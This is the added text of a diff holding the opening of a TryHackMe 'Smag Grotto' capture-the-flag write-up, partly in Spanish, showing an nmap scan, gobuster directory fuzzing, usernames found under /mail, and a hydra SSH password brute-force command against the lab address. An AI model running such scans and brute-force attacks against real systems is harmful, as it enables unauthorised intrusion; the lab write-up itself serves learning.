@@ -1,0 +1,18 @@
+TryHackMe
+Smagg Grotto
+
+nmap
+
+nmap -p 22,80 -sS -sC -sV -n -Pn 10.10.91.8 -oN nmap
+• 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+• 80/tcp open http Apache httpd 2.4.18 (Ubuntu)
+
+fuzz
+
+gobuster dir -u http://10.10.91.8 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
+• /mail
+
+Dentro de /mail encontramos un posible dominio "SMAG.THM" y tres posibles usuarios: "netadmin", "uzi" y "jake".
+Al no encontrar muchas más opciones, optamos por ingresar vía SSH con fuerza bruta, dado que tenemos algunos usuarios.
+
+hydra -l uzi -P /usr/share/wordlists/rockyou.txt -t 4 ssh://10.10.91.8
